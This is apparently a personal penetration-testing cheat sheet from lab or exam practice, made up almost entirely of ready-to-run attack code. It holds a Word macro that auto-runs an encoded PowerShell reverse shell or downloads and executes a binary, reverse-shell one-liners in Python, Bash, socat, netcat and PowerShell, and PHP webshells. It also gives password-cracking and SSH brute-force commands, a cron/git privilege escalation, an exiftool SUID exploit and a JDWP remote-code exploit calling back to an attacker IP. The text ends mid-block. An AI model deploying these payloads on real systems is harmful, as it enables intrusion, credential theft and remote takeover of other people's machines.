> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Minitrue`

```
https://github.com/X0RW3LL/Minitrue
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
```

The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.

```
Create the .doc file
```

```
Use the base64 powershell code from revshells.com
```

```
Used this code to inline macro(Paste the code from revshells in str variable) :

str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA3ADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
```

```
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
```
OR
```VBA
## CAN ALSO TRY MSFVENOM PAYLOAD 1. CERTUTIL to get 2. To run payload
Sub AutoOpen()
	revshell
End Sub

Sub Document_Open()
	revshell
End Sub

Sub revshell()
	Dim StrCmd As String
	StrCmd = "certutil.exe -f -urlcache http://10.10.10.10/rev.exe rev.exe"
	CreateObject("Wscript.Shell").Run StrCmd
	Dim StrCmd2 As String
	StrCmd2 = "powershell.exe -nop -c .\rev.exe"
	CreateObject("Wscript.Shell").Run StrCmd2
End Sub
```


## Python

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Python`

```
import subprocess

# Replace "<your $IP" and "<your $PORT>" with your target IP address and port
reverse_shell_command = 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<your $IP>',<your $PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"'

try:
    # Execute the reverse shell command
    subprocess.run(reverse_shell_command, shell=True)
except Exception as e:
    print(f"An error occurred: {e}")
```


## Bash

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Bash`

```
#!/bin/bash

sh -i 5<> /dev/tcp/[MY_IP]/[MY_PORT] 0<&5 1>&5 2>&5
```

```
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
python3 -m http.server
nc -nlvp 443
<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
```

```
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
shell.php&cmd=
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
or

busybox nc $IP 5000 -e /bin/bash
```

```
&cmd=whoami or ?cmd=whoami
<?php shell_exec($_GET["cmd"]);?>
<?php system($_GET["cmd"]);?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

```
cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
```

```
https://revshells.com/
```

```
/usr/share/wordlists/rockyou.txt
/usr/share/wfuzz/wordlist/others/common_pass.txt
```


## Coding RCEs / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Enumeration`

```
hashid <paste your hash here>
```

```
https://www.onlinehashcrack.com/hash-identification.php
```

```
https://hashcat.net/wiki/doku.php?id=example_hashes
```


## Cracking hashes

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Cracking hashes`

```
https://crackstation.net/
```

```
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
```


## Md5

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Cracking hashes > Md5`

```
hashcat -m 0 -a 0 -o hashout eric.hash /home/jerm/rockyou.txt #if the original doesnt work use this
```

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```


## ssh

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Cracking hashes > Md5 > ssh`

```
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ssh
hydra -l userc -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
```

```
keepass2john Database.kdbx > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```


## KeePass.dmp

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > KeePass.dmp`

```
sudo git clone https://github.com/CMEPW/keepass-dump-masterkey
chmod +x poc.py

python3 poc.py -d /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp 
2023-09-27 20:32:29,743 [.] [main] Opened /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●\`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```


## Downloading keepassxc

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Downloading keepassxc`

```
sudo apt update && sudo apt-get install keepassxc
```

[![image](https://private-user-images.githubusercontent.com/127046919/271147143-7aa67384-ba6b-4a94-b522-99349a987e3d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjcxMTQ3MTQzLTdhYTY3Mzg0LWJhNmItNGE5NC1iNTIyLTk5MzQ5YTk4N2UzZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zNmNiYzUwZWU0NWMyYmRjMGQ5ZjE0YjVjN2I5ZDNhNjBjMjhjMmU5NzM5YzQzY2M5YWQ5NTA0N2UwYTgyZTY3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.RrbeXKp8B_yA6ZJcmsQB4msSmqwf2ire2E0tOI4KFjc)](https://private-user-images.githubusercontent.com/127046919/271147143-7aa67384-ba6b-4a94-b522-99349a987e3d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjcxMTQ3MTQzLTdhYTY3Mzg0LWJhNmItNGE5NC1iNTIyLTk5MzQ5YTk4N2UzZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zNmNiYzUwZWU0NWMyYmRjMGQ5ZjE0YjVjN2I5ZDNhNjBjMjhjMmU5NzM5YzQzY2M5YWQ5NTA0N2UwYTgyZTY3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.RrbeXKp8B_yA6ZJcmsQB4msSmqwf2ire2E0tOI4KFjc)

[![image](https://private-user-images.githubusercontent.com/127046919/271147462-1b97a744-63ab-4264-b3b3-e32485edfceb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjcxMTQ3NDYyLTFiOTdhNzQ0LTYzYWItNDI2NC1iM2IzLWUzMjQ4NWVkZmNlYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yZWMwYTI5MmQ5ZDExOTY1YTk5MDE5ZmFmZDYzNGJkZjIzZTgxZjJjYTllMzc4Y2I3ZTM1ZmQ1MDQ4OGM1ZTQ2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.3nHuctiW8ZmlFU6vYWbCKgAfppNvs5z578dI6I_QgjQ)](https://private-user-images.githubusercontent.com/127046919/271147462-1b97a744-63ab-4264-b3b3-e32485edfceb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjcxMTQ3NDYyLTFiOTdhNzQ0LTYzYWItNDI2NC1iM2IzLWUzMjQ4NWVkZmNlYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yZWMwYTI5MmQ5ZDExOTY1YTk5MDE5ZmFmZDYzNGJkZjIzZTgxZjJjYTllMzc4Y2I3ZTM1ZmQ1MDQ4OGM1ZTQ2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.3nHuctiW8ZmlFU6vYWbCKgAfppNvs5z578dI6I_QgjQ)

```
unzip <file>
unzip bank-account.zip 
Archive:  bank-account.zip
[bank-account.zip] bank-account.xls password:
```

```
zip2john file.zip > test.hash
john --wordlist=/usr/share/wordlists/rockyou.txt test.hash
```

```
https://gchq.github.io/CyberChef/
```


## hashcat output

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Downloading keepassxc > hashcat output`

If hashcat gives back some sort of Hex Encoding you can use cyber chef to finish off the hash and give you back the password

```
$HEX[7261626269743a29]
```

[![image](https://private-user-images.githubusercontent.com/127046919/237830093-88bc13a2-ec53-4a91-8ce1-c484fde12886.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjM3ODMwMDkzLTg4YmMxM2EyLWVjNTMtNGE5MS04Y2UxLWM0ODRmZGUxMjg4Ni5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05MDVlODNiYTQ5ZjU0YjZmMzYwODQ3YjkzNTFjZWExNTFiN2VjNTg2M2NkZDYyMmQzNjRlZWQzZmMwNzExNTE3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.7HN1qdy332BigfvmvVlsxgomCCGjO_lPIKBpNL38wxA)](https://private-user-images.githubusercontent.com/127046919/237830093-88bc13a2-ec53-4a91-8ce1-c484fde12886.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjM3ODMwMDkzLTg4YmMxM2EyLWVjNTMtNGE5MS04Y2UxLWM0ODRmZGUxMjg4Ni5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05MDVlODNiYTQ5ZjU0YjZmMzYwODQ3YjkzNTFjZWExNTFiN2VjNTg2M2NkZDYyMmQzNjRlZWQzZmMwNzExNTE3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.7HN1qdy332BigfvmvVlsxgomCCGjO_lPIKBpNL38wxA)


## Background

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > Downloading keepassxc > Background`

```
We typically know we can unzip files and get de-compress the results, in this case we unzipped the zip file and got almost nothing back it was weird, we used instead the commands below to test for a password on the zip file and it did indeed prompt us to enter a zip file password, we used our cracking technique of hashes above was able to login with su chloe with the password we found in the file
```

```
sudo 7z x sitebackup3.zip
```

```
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD Ryzen 5 5500U with Radeon Graphics          (860F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 25312 bytes (25 KiB)

Extracting archive: sitebackup3.zip
--
Path = sitebackup3.zip
Type = zip
Physical Size = 25312

    
Enter password (will not be echoed):
Everything is Ok         

Folders: 17
Files: 19
Size:       67063
Compressed: 25312
```


## rdp

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation > Coding RCEs > rdp`

```
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be22022754bf0975251e1e7ac
```


## Shell / Linux

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Linux`

```
which python
which python2
which python3
python -c ‘import pty; pty.spawn(“/bin/bash”)’
```

```
which socat
socat file:\`tty\`,raw,echo=0 tcp-listen:4444 #On Kali Machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
```

```
Command 'ls' is available in '/bin/ls'
export PATH=$PATH:/bin
```

```
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
export PATH=$PATH:/usr/bin
```

```
-rbash: $'\r': command not found
BASH_CMDS[a]=/bin/sh;a
```

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```


## Stable shell

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Windows > Stable shell`

```
nc -nlvp 9001
.\nc.exe <your kali IP> 9001 -e cmd
C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe
```


## Windows / Powershell

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Windows > Powershell`

```
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444" >> Invoke-PowerShellTcp.ps1
powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victim run this
```

```
https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/pivoting-basics/
```


## Commands

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Commands`

```
ps aux | grep ssh
kill (enter pid #)
```


## Crontab/Git

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Crontab/Git`

In this priv esc scenario we logged in via ssg, found that a cron job was running bash file with root privs. We could git clone that same repo with the private key we find in user gits ssh folder and edit the bash file to give us a rce as root.

```
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Jan 23 10:34 cron.daily
-rw------- 1 root root    9 May 28 02:19 cron.monthly
-rw------- 1 root root    9 May 28 02:19 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

```
-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
```


## Setup

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Crontab/Git > Setup`

```
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.214.125:/git-server
```

```
cd git-server
cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#
```

```
cat backups.sh 
#!/bin/bash
sh -i >& /dev/tcp/192.168.45.191/18030 0>&1
```

```
chmod +x backups.sh
```

```
GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git status            
On branch master
Your branch is up to date with 'origin/master'.

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        modified:   backups.sh

no changes added to commit (use "git add" and/or "git commit -a")
```

```
git config --global user.name "git"
git config --global user.email "git@userD" #User is the same from the private key git@
```

```
GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git add --all
IT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git commit -m "PE Commit"

[master 872aa26] Commit message
 1 file changed, 1 insertion(+), 4 deletions(-)
 
 GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git push origin master        
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 3 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 294 bytes | 147.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.214.125:/git-server
   b50f4e5..872aa26  master -> master
```

```
nc -nlvp 18030                                   
listening on [any] 18030 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.125] 48038
sh: cannot set terminal process group (15929): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.0# id
id
uid=0(root) gid=0(root) groups=0(root)
sh-5.0#
```

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```

```
www-data@exfiltrated:/opt$ cat image-exif.sh
cat image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"

IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=\`openssl rand -hex 5\`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```


## Setup

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Crontab/Git > Setup`

```
sudo apt-get install -y djvulibre-bin
wget -qO sample.jpg placekitten.com/200
file sample.jpg
printf 'P1 1 1 1' > input.pbm
cjb2 input.pbm mask.djvu
djvumake exploit.djvu Sjbz=mask.djvu
echo -e '(metadata (copyright "\\\n" . \`chmod +s /bin/bash\` #"))' > input.txt
djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
```


## Exploit

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Crontab/Git > Exploit`

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.191:80/exploit.jpg
```

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ /bin/bash -p
/bin/bash -p
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```


## pspy

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Crontab/Git > pspy`

```
https://github.com/DominicBreuker/pspy
```

```
/opt/pspy/pspy64 #transfer over to victim
```

```
chmod +x pspy64
./pspy64 -pf -i 1000
```


## Active Ports

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Active Ports`

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp   LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*                                                                                                                                                                                
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511        127.0.0.1:8000      0.0.0.0:*          
tcp   LISTEN 0      128             [::]:2222         [::]:*          
tcp   LISTEN 0      511                *:80              *:*          
tcp   LISTEN 0      511                *:443             *:*
```

```
ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
```


## Curl

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Active Ports > Curl`

```
curl 127.0.0.1:8000
```


## JDWP

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > processes > JDWP`

```
root         852  0.0  3.9 2536668 80252 ?       Ssl  May16   0:04 java -Xdebug Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
```

```
dev@example:/opt/stats$ cat App.java
cat App.java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

class StatsApp {
    public static void main(String[] args) {
        System.out.println("System Stats\n");
        Runtime rt = Runtime.getRuntime();
        String output = new String();

        try {
            ServerSocket echod = new ServerSocket(5000);
            while (true) {
              output = "";
              output += "Available Processors: " + rt.availableProcessors() +"\r\n";
              output += "Free Memory: " + rt.freeMemory() + "\r\n";
              output += "Total Memory: " + rt.totalMemory() +"\r\n";

              Socket socket = echod.accept();
              InputStream in = socket.getInputStream();
              OutputStream out = socket.getOutputStream();
              out.write((output + "\r\n").getBytes());
              System.out.println(output);
            }
        } catch (IOException e) {
            System.err.println(e.toString());
            System.exit(1);
        }
    }
}
```

```
https://github.com/IOActive/jdwp-shellifier
```

```
proxychains python2 jdwp-shellifier.py -t 127.0.0.1
nc -nv 192.168.234.150 5000 #this port runs on the app.java, do this to trigger it
```


## RCE

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > processes > JDWP > RCE`

```
proxychains python2 jdwp-shellifier.py -t 127.0.0.1 --cmd "busybox nc 192.168.45.191 80 -e sh"
nc -nv 192.168.234.150 5000 #to trigger alert
nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.234.150] 59382
id
uid=0(root) gid=0(root)
```


## Squid 4.14

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > processes > JDWP > Squid 4.14`

- Port 3128 is Squid 4.14
- The `Squid` proxy seems to be misconfigured and we can use it to proxy to internal ports
	- Run `spose.py` tool and find other open ports!
		- `python spose.py --proxy http://10.10.11.10:3128 --target 10.10.11.10`
- Setup FoxyProxy web extension and add the following proxy
	- `192.168.165.189 3128`
![[Pasted image 20250730163528.png]]
- Now we can access the port 8080!
- 8080 is INTERNAL PORT (see 3128 enumeration notes)
- `phpmyadmin` - exploit for PhpMyAdmin
	- https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f?ref=benheater.com
	- Creates a directory (`/uiploader.php`)to upload a webshell to the webroot
```SQL
|   |
|---|
|SELECT|
